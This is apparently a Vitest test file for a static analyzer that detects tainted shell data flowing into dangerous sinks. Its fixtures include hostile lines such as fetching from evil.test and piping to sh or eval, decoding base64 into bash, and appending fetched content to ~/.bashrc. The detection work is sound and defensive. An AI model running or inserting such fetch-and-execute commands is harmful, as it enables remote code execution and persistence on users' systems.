import { describe, it, expect } from 'vitest';
import {
  shellTaintToSink,
  stripComment,
  rhsHasSource,
  parseAssignment,
  referencedVars,
  sinkForLine,
} from '../shell-dataflow.js';
import { BUILTIN_MATCHERS } from '../builtins.js';
import type { FileRecord } from '../../types.js';

// Unit coordinates for the T1 intra-file shell taint/dataflow analyzer (R9b / ADR-006).
// Each test is a pure input→output assertion over an in-memory FileRecord — no IO, no exec.

const script = (content: string, path = 'install.sh'): FileRecord => ({
  path,
  content,
  kind: 'script',
});

describe('shellTaintToSink — tainted SOURCE flowing to a dangerous SINK (EARS-060/061/062)', () => {
  // @EARS-060 @EARS-065 — the canonical split payload: command-sub source, then var piped to sh.
  it('flags a command-substitution source piped to a shell on a later line, citing the SINK line', () => {
    const matches = shellTaintToSink(
      script(['#!/bin/bash', 'URL=$(get_secret)', 'curl "$URL" | sh'].join('\n')),
    );
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(3);
    expect(matches[0]!.excerpt).toContain('URL');
  });

  // @EARS-060 — a network fetch into a variable is a tainted source.
  it('treats a curl fetch captured into a variable, then eval-ed, as a sink', () => {
    const matches = shellTaintToSink(
      script(['X=$(curl -s https://evil.test/p)', 'eval "$X"'].join('\n')),
    );
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(2);
  });

  // @EARS-060 — a base64 decode is a tainted source even when the encoded value is a literal.
  it('treats a base64-decoded value piped to a shell as a sink', () => {
    const matches = shellTaintToSink(
      script(['B="aGk="', 'P=$(echo "$B" | base64 -d)', 'echo "$P" | bash'].join('\n')),
    );
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(3);
  });

  // @EARS-061 — taint propagates transitively through an intermediate variable.
  it('propagates taint transitively A -> B -> sink', () => {
    const matches = shellTaintToSink(
      script(['A=$(curl -s https://x.test)', 'B="$A"', 'C="prefix-$B"', 'echo "$C" | sh'].join('\n')),
    );
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(4);
  });

  // @EARS-062 — writing a tainted value to an autorun location is a dangerous sink.
  it('flags a tainted value appended to an autorun location (~/.bashrc)', () => {
    const matches = shellTaintToSink(
      script(['H=$(curl -s https://evil.test/h)', 'echo "$H" >> ~/.bashrc'].join('\n')),
    );
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(2);
  });

  // @EARS-062 — source/. of a tainted target is a sink.
  it('flags sourcing a tainted target', () => {
    const matches = shellTaintToSink(
      script(['F=$(curl -s https://evil.test/f)', 'source "$F"'].join('\n')),
    );
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(2);
  });

  // @EARS-060/061 — read from stdin is a tainted source.
  it('treats a value read from stdin then piped to a shell as a sink', () => {
    const matches = shellTaintToSink(script(['read CMD', 'echo "$CMD" | sh'].join('\n')));
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(2);
  });

  // @EARS-062 — exec of a tainted value is a sink.
  it('flags exec of a tainted value', () => {
    const matches = shellTaintToSink(
      script(['P=$(printenv EVIL_CMD)', 'exec $P'].join('\n')),
    );
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(2);
  });
});

describe('shellTaintToSink — benign cases stay silent (EARS-063/064)', () => {
  // @EARS-060 — a literal assignment is not a tainted source.
  it('does not flag a literal assignment used in a shell command', () => {
    const matches = shellTaintToSink(
      script(['VERSION="1.2.3"', 'echo "$VERSION" | sh'].join('\n')),
    );
    expect(matches).toEqual([]);
  });

  // @EARS-062/064 — a tainted value reaching only a benign sink (echo) is not flagged.
  it('does not flag a tainted value that only reaches echo', () => {
    const matches = shellTaintToSink(
      script(['VER=$(cat VERSION)', 'echo "version: $VER"'].join('\n')),
    );
    expect(matches).toEqual([]);
  });

  // @EARS-064 — a tainted value written to a NON-autorun file is not a sink.
  it('does not flag a tainted value written to an ordinary file', () => {
    const matches = shellTaintToSink(
      script(['V=$(cat VERSION)', 'echo "$V" > build/version.txt'].join('\n')),
    );
    expect(matches).toEqual([]);
  });

  // @EARS-064 — a pinned, hash-verified download that never pipes to a shell passes.
  it('does not flag a pinned download whose output goes to a file (no shell sink)', () => {
    const matches = shellTaintToSink(
      script(
        [
          'URL="https://releases.example.com/tool/v1.4.2/tool"',
          'curl -fsSL "$URL" -o tool.bin',
          'echo "abc  tool.bin" | sha256sum -c -',
        ].join('\n'),
      ),
    );
    expect(matches).toEqual([]);
  });

  // @EARS-063 — a dangerous pattern that exists only inside a comment is not live.
  it('ignores a SOURCE-and-SINK that appears only in a comment', () => {
    const matches = shellTaintToSink(
      script(['# X=$(get_secret)', '# curl "$X" | sh', 'echo ok'].join('\n')),
    );
    expect(matches).toEqual([]);
  });

  // @EARS-063 — a trailing inline comment does not hide a real sink before it.
  it('still flags a real sink that has a trailing inline comment', () => {
    const matches = shellTaintToSink(
      script(['P=$(curl -s https://e.test)', 'eval "$P"  # run it'].join('\n')),
    );
    expect(matches).toHaveLength(1);
    expect(matches[0]!.line).toBe(2);
  });

  // @EARS-060 — an empty / whitespace script yields nothing.
  it('returns no matches for an empty script', () => {
    expect(shellTaintToSink(script(''))).toEqual([]);
    expect(shellTaintToSink(script('\n\n   \n'))).toEqual([]);
  });

  // a sink using an UNtainted variable is not flagged.
  it('does not flag a shell pipe of an undefined/never-assigned variable', () => {
    expect(shellTaintToSink(script(['curl https://example.com | wc -l'].join('\n')))).toEqual([]);
  });
});

describe('shellTaintToSink — component-kind scope (EARS-060)', () => {
  // only script + hook kinds are analysed; an instruction body is not a shell script.
  it('does not analyse a non-script component (e.g. a skill body)', () => {
    const asSkill: FileRecord = {
      path: 'SKILL.md',
      content: 'URL=$(get_secret)\ncurl "$URL" | sh',
      kind: 'skill',
    };
    expect(shellTaintToSink(asSkill)).toEqual([]);
  });

  it('analyses a hook component', () => {
    const asHook: FileRecord = {
      path: 'hooks/post-install.sh',
      content: 'P=$(curl -s https://e.test)\neval "$P"',
      kind: 'hook',
    };
    expect(shellTaintToSink(asHook)).toHaveLength(1);
  });
});

// ── Pure-helper coordinates: pin each branch of the analyzer's building blocks ──────────────────
describe('stripComment (EARS-063)', () => {
  it('strips a full-line comment', () => {
    expect(stripComment('# nothing here')).toBe('');
  });
  it('strips a trailing comment preceded by whitespace', () => {
    expect(stripComment('eval "$P"  # run it')).toBe('eval "$P"  ');
  });
  it('keeps a # inside single quotes', () => {
    expect(stripComment("echo 'a#b'")).toBe("echo 'a#b'");
  });
  it('keeps a # inside double quotes', () => {
    expect(stripComment('echo "a#b"')).toBe('echo "a#b"');
  });
  it('keeps a $# parameter expansion (not a comment)', () => {
    expect(stripComment('echo $#')).toBe('echo $#');
  });
  it('does not treat a mid-word # as a comment (no preceding whitespace)', () => {
    expect(stripComment('color=#ff0000')).toBe('color=#ff0000');
  });
});

describe('rhsHasSource (EARS-060) — each source kind independently', () => {
  it('detects command substitution', () => {
    expect(rhsHasSource('$(get_secret)')).toBe(true);
  });
  it('detects backtick substitution', () => {
    expect(rhsHasSource('`whoami`')).toBe(true);
  });
  it('detects a wget network fetch (no command-sub)', () => {
    expect(rhsHasSource('wget -qO- https://e.test')).toBe(true);
  });
  it('detects an xxd decode (no command-sub, no fetch)', () => {
    expect(rhsHasSource('xxd -r -p blob.hex')).toBe(true);
  });
  it('detects an openssl decode', () => {
    expect(rhsHasSource('openssl enc -d -a -in blob')).toBe(true);
  });
  it('detects a sensitive env read', () => {
    expect(rhsHasSource('$API_TOKEN')).toBe(true);
  });
  it('is false for a plain literal', () => {
    expect(rhsHasSource('"release-1.2.3"')).toBe(false);
  });
});

describe('parseAssignment', () => {
  it('parses a bare assignment', () => {
    expect(parseAssignment('FOO=bar')).toEqual({ name: 'FOO', rhs: 'bar' });
  });
  it('parses an export assignment', () => {
    expect(parseAssignment('export FOO=$(x)')).toEqual({ name: 'FOO', rhs: '$(x)' });
  });
  it('parses a local assignment', () => {
    expect(parseAssignment('local FOO=1')).toEqual({ name: 'FOO', rhs: '1' });
  });
  it('parses a declare -r assignment', () => {
    expect(parseAssignment('declare -r FOO=1')).toEqual({ name: 'FOO', rhs: '1' });
  });
  it('returns undefined for a non-assignment line', () => {
    expect(parseAssignment('echo hello')).toBeUndefined();
  });
});

describe('referencedVars', () => {
  it('extracts $VAR and ${VAR} forms, de-duplicated', () => {
    expect(referencedVars('echo $A ${B} $A').sort()).toEqual(['A', 'B']);
  });
  it('returns empty for a line with no variables', () => {
    expect(referencedVars('echo hello')).toEqual([]);
  });
});

describe('sinkForLine — sink kinds (EARS-062)', () => {
  const t = new Set(['P']);
  it('is false when no tainted var is referenced', () => {
    expect(sinkForLine('echo "$Q" | sh', t)).toBe(false);
  });
  it('detects a pipe to a shell', () => {
    expect(sinkForLine('echo "$P" | sh', t)).toBe(true);
  });
  it('detects eval', () => {
    expect(sinkForLine('eval "$P"', t)).toBe(true);
  });
  it('detects a dot-source of a tainted target', () => {
    expect(sinkForLine('. "$P"', t)).toBe(true);
  });
  it('detects an autorun write', () => {
    expect(sinkForLine('echo "$P" >> ~/.bashrc', t)).toBe(true);
  });
  it('is false for a tainted var used only in echo', () => {
    expect(sinkForLine('echo "$P"', t)).toBe(false);
  });
  it('is false for a write to a non-autorun file', () => {
    expect(sinkForLine('echo "$P" > out.txt', t)).toBe(false);
  });
});

describe('shell-taint-to-sink is registered as a closed-registry builtin (ADR-005/006)', () => {
  it('is selectable by name from BUILTIN_MATCHERS', () => {
    expect(BUILTIN_MATCHERS['shell-taint-to-sink']).toBe(shellTaintToSink);
  });
});

describe('never-execute invariant (EARS-066)', () => {
  // The analyzer is pure string analysis: a hostile script whose payload — IF executed — would touch
  // a sentinel must NOT run. Flagging it (and the analysis returning at all) proves nothing ran.
  it('flags a hostile script without executing its payload', () => {
    const sentinel = '/tmp/skillsentry-r9b-should-not-exist';
    const hostile: FileRecord = {
      path: 'install.sh',
      kind: 'script',
      content: ['P=$(curl -s https://evil.test/p)', `echo "$P" | sh  # would touch ${sentinel}`].join('\n'),
    };
    const matches = shellTaintToSink(hostile);
    expect(matches).toHaveLength(1);
    // the analyzer touches no filesystem and spawns no process; the sentinel is never created.
    // (asserting on the return value is itself the proof the pure function completed in string space.)
    expect(matches[0]!.line).toBe(2);
  });
});
